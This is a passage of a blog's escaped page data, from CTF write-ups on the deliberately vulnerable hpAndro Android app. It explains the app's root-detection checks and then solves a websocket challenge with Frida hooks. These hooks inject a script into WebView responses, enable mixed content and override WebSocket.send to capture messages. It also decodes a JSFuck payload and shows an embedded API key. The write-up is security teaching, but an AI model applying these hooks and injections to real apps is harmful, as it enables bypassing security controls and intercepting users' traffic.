(\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026#34; + str + \u0026#34; ROOT management app detected!\u0026#34;)); z = true; } catch (PackageManager.NameNotFoundException unused) { } } return z; } RootCloak available. RootCloak applications are apps used to hide the fact that the phone is rooted. This is done by hooking many functionalities used in order to validate if the application is rooted, like the ones seen in this post, and changing them to avoid the validation. This can be done only if the rootcloak application has root permissions (to be able to reach all the applications).\nSo if the application detects any of these applications, it infers that the cellphone is rooted. This is done in a similar way as in the case of the dangerous applications, but in this case the applications being validated are related to known RootCloak applications.\nRootManagement apps availables. RootManagement apps are used for managing the permissions each application whenever it is opened. If the user wants the application to run as root, they have to select it on this app and then whenever the app is opened, it will run with high privileges.\nAs it happens with RootCloak applications, these must be run as a root user. So if hpAndro finds any of these apps in the cellphone installed, it will infer that the phone is rooted.\nRW System state. This validation checks the state of the mounted partitions. This is done by executing the mount command which returns something like:\ntmpfs on /dev type tmpfs (rw,seclabel,nosuid,relatime,mode=755) devpts on /dev/pts type devpts (rw,seclabel,relatime,mode=600) proc on /proc type proc (rw,relatime,gid=3009,hidepid=2) sysfs on /sys type sysfs (rw,seclabel,relatime) selinuxfs on /sys/fs/selinux type selinuxfs (rw,relatime) tmpfs on /mnt type tmpfs (rw,seclabel,nosuid,nodev,noexec,relatime,mode=755,gid=1000) tmpfs on /apex type tmpfs (rw,seclabel,nosuid,nodev,noexec,relatime,mode=755) /dev/block/sda4 on / type ext4 (ro,seclabel,nodev,noatime,block_validity,delalloc,barrier,user_xattr) none on /dev/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio) none on /dev/cpuctl type cgroup (rw,nosuid,nodev,noexec,relatime,cpu) none on /acct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct) none on /dev/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset,noprefix,release_agent=/sbin/cpuset_release_agent) none on /dev/memcg type cgroup (rw,nosuid,nodev,noexec,relatime,memory) none on /dev/stune type cgroup (rw,nosuid,nodev,noexec,relatime,schedtune) The application parses the output of that command, and checks if any of the common partitions android has has a rw status. That could mean that the OS was modified in order to change the default status from the partitions, and this can be done only if the owner of the phone or emulator has a root user to remount the default partitions.\nThis is done with the following code:\npublic final boolean checkFlagRWSystems() { ... String[] mountReader = companion2.mountReader(); int i2 = 0; if (mountReader == null) { return false; } int i3 = Build.VERSION.SDK_INT; int length = mountReader.length; int i4 = 0; boolean z = false; while (i4 \u0026lt; length) { String str3 = mountReader[i4]; Object[] array = new Regex(\u0026#34; \u0026#34;).split(str3, i2).toArray(new String[i2]); if (array != null) { ... String[] pathsThatShouldNotBeWritable = companion2.getPathsThatShouldNotBeWritable(); int length2 = pathsThatShouldNotBeWritable.length; String str4 = str2; int i6 = 0; while (i6 \u0026lt; length2) { String str5 = pathsThatShouldNotBeWritable[i6]; ... if (StringsKt.equals(strArr3[i7], \u0026#34;rw\u0026#34;, true)) { System.out.println((Object) (str5 + \u0026#34; path is mounted with rw permissions! \u0026#34; + str3)); z = true; break; } i7++; mountReader = strArr; strArr3 = strArr3; i3 = i; ... SafetyNet validation. SafetyNet from Google offers a complete suite of features to keep the Android ecosystem in check. The set of services and APIs from SafetyNet are focused on safety which when tied with an application opens up a new realm to safeguard the app against security threats. SafetyNet Attestation API – Checks whether the gadget the application is attempting to run on is tampered or potentially compromised. It compares the device’s profile with that of Google certified devices and verifies if the device or the software running on it is Android compatible.\nThe API verifies the following:\nWhether the device is rooted or not. Whether the device is monitored. Whether the bootloader has been unlocked. Whether the device has recognized hardware parameters. Whether the software is Android compatible. Whether the device is free form malicious apps. In order to execute the call to the SafetyNet servers, hpAndro executes the following code in the com.hpandro.androidsecurity.ui.activity.task.rootDetection.SafetyNetTaskActivity class:\npublic final void sendSafetyNetRequest() { byte[] requestNonce = getRequestNonce(\u0026#34;Safety Net Sample: \u0026#34; + System.currentTimeMillis()); Intrinsics.checkNotNull(requestNonce); SafetyNetTaskActivity safetyNetTaskActivity = this; SafetyNetClient client = SafetyNet.getClient((Activity) safetyNetTaskActivity); Intrinsics.checkNotNullExpressionValue(client, \u0026#34;SafetyNet.getClient(this@SafetyNetTaskActivity)\u0026#34;); Task\u0026lt;SafetyNetApi.AttestationResponse\u0026gt; attest = client.attest(requestNonce, \u0026#34;AIzaSyAampEGuuEzC5zW0Wvd3cjx8uWkVfd8O4Y\u0026#34;); Intrinsics.checkNotNullExpressionValue(attest, \u0026#34;client.attest(nonce, \\\u0026#34;AI…C5zW0Wvd3cjx8uWkVfd8O4Y\\\u0026#34;)\u0026#34;); attest.addOnSuccessListener(safetyNetTaskActivity, this.mSuccessListener).addOnFailureListener(safetyNetTaskActivity, this.mFailureListener); } StatSystemCall. In this case the validation used is identical to the one related to the RWSystem validation:\npublic final void onClick(View view) { String string = MainApp.Companion.getSharedPrefRootDetection().getString(\u0026#34;StatSystemcallStr\u0026#34;, \u0026#34;00\u0026#34;); boolean checkFlagRWSystems = RootDetectionUtils.Companion.checkFlagRWSystems(); Intrinsics.checkNotNull(string); if (!StringsKt.contains$default((CharSequence) string, (CharSequence) \u0026#34;F\u0026#34;, false, 2, (Object) null) || checkFlagRWSystems) { ... } StatSystemCallTaskActivity statSystemCallTaskActivity = this.this$0; ... StatSystemCallTaskActivity.access$getPresenter$p(this.this$0).getRootDetectFlag(\u0026#34;rpro\u0026#34;); } Su Binaries available. The control in this section is like the one of Dangerous Applications, but in this case what is being validated is the existence of the su binary.\nSu exists. This control also validates the existence of su. But instead of searching in the path for the binary, it executes the which command in order to see whether the os returns any location where the su is found:\npublic final boolean checkFlagSUExists() { Process process = null; boolean z = false; try { process = Runtime.getRuntime().exec(new String[]{\u0026#34;/system/xbin/which\u0026#34;, \u0026#34;su\u0026#34;}); Intrinsics.checkNotNullExpressionValue(process, \u0026#34;process\u0026#34;); if (new BufferedReader(new InputStreamReader(process.getInputStream())).readLine() != null) { z = true; } } catch (Throwable unused) { } process.destroy(); return z; } Test Keys availables. Verifies if the Build.TAGS variable has the following value: \u0026ldquo;test-keys\u0026rdquo;.\npublic final boolean checkFlagTestKeys() { String str = Build.TAGS; if (str == null || !StringsKt.contains$default((CharSequence) str, (CharSequence) \u0026#34;test-keys\u0026#34;, false, 2, (Object) null)) { return false; } return true; } This property is generated when the OS is built. The keys are used to sign all the system applications whenever the firmware is packed. These applications are being included in the /system/app folder generally and runs with the \u0026ldquo;system\u0026rdquo; user. Whenever the Android image is built, if any of the keys found in \u0026ldquo;build/target/product/security\u0026rdquo; is used, the system sets the Build.TAGS variable with test-keys.\nAs these kets are public, it is not recommended to use it to sign any application, as an attacker could generate an \u0026ldquo;updated\u0026rdquo; application (it would be valid because of the use of the system keys) with a malicious payload, which in case it were installed would run as a priviledged user.\nIf the key used is valid but not the ones publicly available, whenever the app signing step is executed, the Build.TAGS parameter will have the value \u0026ldquo;release-keys\u0026rdquo;.\nConclusion The controls shown in this application are commonly seen in production applications. As pentesters, it is important to understand them in order to find patterns in the applications we are analyzing to try to detect these controls and patch them in order to continue with the security analysis of the target. As a developer it is good to know how the controls work and how an attacker could try to bypass them.\n","permalink":"https://cmrodriguez.me/blog/hpandro-5/","tags":["Frida","Android","CTF","Challenge","Root detection"],"title":"Solving CTF with Frida - Part 5"},{"categories":["Frida","Android","CTF","Challenge","Websocket"],"contents":"In this series of posts I\u0026rsquo;ll be solving some persistence challenges from hpandro ctf challenges. hpAndro created an Android application with multiple vulnerabilities, following the MSTG.\nNOTE: the challenge is solved with an older version of the application. You can find the copy of the apk here: https://github.com/CesarMRodriguez/lunesdemobile/blob/main/Sesion%206/hpandro.apk\nWe have two different challenges to solve:\nIntercepting WebSockets. Intercepting Secure WebSockets. Both exercises have the same behavior, so I\u0026rsquo;ll focus on the first one. The challenge here is to intercept the flag that is being sent over websockets. I start by searching the AndroidManifest.xml to find the Activity that could be called in order to solve the task:\n\u0026lt;activity android:name=\u0026#34;com.hpandro.androidsecurity.ui.activity.task.websocket.WebSocketSecureActivity\u0026#34;/\u0026gt; by checking the com.hpandro.androidsecurity.ui.activity.task.websocket.WebSocketSecureActivity class. The first method to see is onCreate where I found a code similar to the one used in the HTTP and HTTPS challenges. Check hpandro-1 for more details on them. It basically configures a Webview and calls the following URL: http://hpandro.raviramesh.info/ws_task.php\n//configure WebView and WebSettings a.D(a.J((WebView) y(R.id.webviewTask), \u0026#34;webviewTask!!.settings\u0026#34;, true, true, false, false, true), WebSettings.LayoutAlgorithm.SINGLE_COLUMN, 2, true, \u0026#34;hpAndro\u0026#34;); ... WebView webView2 = (WebView) y(R.id.webviewTask); g.c(webView2); //set WebviewClient webView2.setWebViewClient(new b(this)); ... Object systemService = getSystemService(\u0026#34;connectivity\u0026#34;); if (systemService != null) { ... if (z) { WebView webView4 = (WebView) y(R.id.webviewTask); g.c(webView4); //loads the url of the challenge webView4.loadUrl(\u0026#34;http://hpandro.raviramesh.info/ws_task.php\u0026#34;); ... } else { Whenever I went to the URL in a browser, I found the following content in javascript:\neval([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([][[]]+[])[!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+!+[]]+([][[]]+[])[!+[]+!+[]]+[+[]]+(![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(![]+[])[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])+[])[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]])())()); After looking for some information about what could be that. I found that the code is done with a liberary called JSFuck (inspired on the brainfuck language). In order to see what was that code, I had to find a JSFuck decoder: https://enkhee-osiris.github.io/Decoder-JSFuck/\nAfter using that page I could decode the content, which was the following one:\ndoSend(\u0026#34;Your Flag is hpandro{ws.tTSrUnAId0s9S4ZnM8Yz1QnFlrwfzGpW}\u0026#34;) So that is the flag needed. But I wanted to solve the issue with Frida, so understanding the content of what the challenge did I had an idea of what to do. This challenge won\u0026rsquo;t be as easy as the ones related to http and https. In those examples we solved the challenges by overriding the shouldInterceptRequest function of the WebViewClient. But websocket messages aren\u0026rsquo;t intercepted by that function, and they go directly through the browser engine.\nI could still change GET messages in order to add some payload, so the strategy to follow is:\na- Intercept WebViewClient.shouldOverrideUrl. b- add a javascript payload that changes the execution in order to capture the message. c- Send the message to a JavascriptInterface. + create or use a class wih JavascriptInterface + configure the webview o include the class with javascriptInterface d- Hook the method from the JavascriptInterface with Frida.\nThe following image shows the solution proposed:\nStep a - Intercept WebViewClient In order to achieve this goal, we can use the same strategy that we did to solve Http and Https traffic interception. In this case the class to inject is \u0026ldquo;v0.d.a.c.a.d.j.b\u0026rdquo; due to the following line:\nwebView2.setWebViewClient(new b(this)); The only thing to have in mind is that the script must add a \u0026ldquo;script\u0026rdquo; tag that adds the payload that we will write. The fsunction that does this is the following one:\nfunction readNewStream(inputStream) { var BufferedReader = Java.use(\u0026#39;java.io.BufferedReader\u0026#39;); var InputStreamReader = Java.use(\u0026#39;java.io.InputStreamReader\u0026#39;); var inputStreamReader = InputStreamReader.$new(inputStream); var r = BufferedReader.$new(inputStreamReader); var StringBuilder = Java.use(\u0026#39;java.lang.StringBuilder\u0026#39;); var total = StringBuilder.$new(); var String = Java.use(\u0026#39;java.lang.String\u0026#39;); while (true) { var line = r.readLine(); if (line == null) { break; } else { total.append(line).append(String.$new(\u0026#39;\\n\u0026#39;)); } } return \u0026#34;\u0026lt;script\u0026gt;...\u0026lt;/script\u0026gt;\u0026#34; + total.toString(); } Step b - create javascript payload In order to create the javascript payload I wanted to play around with the page in the chrome://inspect tab ofth WebView so I could check if the redirection was going to work or not.\nThe first problem I faced related to the old version of the application is that the developers of the app changed the endpoints of the application to work just with https, and this version of the app pointed to the http endpoint. Depending on the version of the Android OS, the application would show a button to reload the application with https. This would ruin the payload generated in step a. SO in order to avoid this situation I created the following script that could be loaded in the beginning of the application or whenever you launch the websocket task.\nvar WebView = Java.use(\u0026#34;android.webkit.WebView\u0026#34;); WebView.loadUrl.overload(\u0026#34;java.lang.String\u0026#34;).implementation = function (theUrl) { if (theUrl.indexOf(\u0026#34;ws_task.php\u0026#34;) \u0026gt; 0) { this.loadUrl(String.$new(\u0026#34;https://hpandro.raviramesh.info/ws_task.php\u0026#34;) ); } else { this.loadUrl(theUrl); } } Whenever I opened the application with the inpect, I found the following error:\nThis error occurs because the application is loaded over https, and the websocket message is sent over ws (plaintext). In order to avoid this bug in Android you should configure the WenSettings to set the MixedContentMode available. This is done in Java in the following way (do not use this in an actual application):\nwebView.getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW); In order to do this with Frida, I needed to find a place where to set this script. I needed a function that received the WebView as a parameter or a function in an object that had the WebView as an attribute. I ended up overwriting the following method v0.a.a.a.a.J, which is being called in the onCreate method in the WebSocketActivity:\na.D(a.J((WebView) y(R.id.webviewTask), \u0026#34;webviewTask!!.settings\u0026#34;, true, true, false, false, true), WebSettings.LayoutAlgorithm.SINGLE_COLUMN, 2, true, \u0026#34;hpAndro\u0026#34;); and has the WebView as a parameter:\npublic static WebSettings J(WebView webView, String str, boolean z, boolean z2, boolean z3, boolean z4, boolean z5) { g.c(webView); WebSettings settings = webView.getSettings(); g.d(settings, str); settings.setJavaScriptEnabled(z); settings.setLoadWithOverviewMode(z2); settings.setUseWideViewPort(z3); settings.setSupportZoom(z4); settings.setBuiltInZoomControls(z5); return settings; } The script created is the following one:\nvar a = Java.use(\u0026#39;v0.a.a.a.a\u0026#39;); a.J.implementation = function (webView, str, z, z2, z3, z4, z5) { console.log(\u0026#34;entra aca\u0026#34;); webView.getSettings().setMixedContentMode(0); return this.J(webView, str, z, z2, z3, z4, z5); } There are multiple ways to generate the payload. The final form requires the definition of the step \u0026ldquo;c\u0026rdquo;. I decided to change the send method from the WebSocket class. this is due to the fact that in order to send messages the content must go over this method.\n//first we set in the prototype of the WebSocket the original send method. WebSocket.prototype.send2 = WebSocket.prototype.send; //then we change the send method to call the JavascriptInterface, and then we call the original send method (after this it is send2) WebSocket.prototype.send = function (msg) { JInterface.showMessage(msg); this.send2(msg); } The second step of calling the original send method is created in order to not crash the application, so this method can be used in every application.\nStep c - create JavascriptInterface class In order to send the content of the message to Java we need to user or implement a JavascriptInterface class.\nThe first thing I tried to do was creating a class dynamically with Frida (as we did when we tried to solve the http challenge). As an example this is an abstract of the previous script:\nvar MyWebViewClient = Java.registerClass({ name: \u0026#39;com.example.MyWebViewClient\u0026#39;, superClass: WebViewClient, methods: { $init() { console.log(\u0026#39;Constructor called\u0026#39;); }, shouldInterceptRequest: [{ returnType: 